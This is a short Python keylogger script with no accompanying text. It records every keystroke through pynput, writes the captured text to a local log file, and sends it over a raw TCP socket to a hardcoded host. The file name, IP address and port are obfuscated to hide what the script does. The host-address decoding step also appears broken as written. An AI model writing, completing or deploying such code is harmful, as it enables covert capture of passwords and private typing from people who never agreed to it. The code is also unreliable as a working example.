import importlib
keyboard = importlib.import_module('pynput.keyboard')
import socket
import os
log = ""
def on_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            log += ' '
        else:
            log += str(key)
def send_logs():
    global log
    server_ip = bytearray([192, 168, 122, 182]).decode()
    port = int('0x232c', 16)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((server_ip, port))
            s.sendall(log.encode())
        except Exception as e:
            pass
def write_file():
    global log
    with open(''.join(['k', 'e', 'y', 'l', 'o', 'g', 's', '.', 't', 'x', 't']), 'a') as f:
        f.write(log)
with keyboard.Listener(on_press=on_press) as listener:
    try:
        listener.join()
    except KeyboardInterrupt:
        pass
    finally:
        write_file()
        send_logs()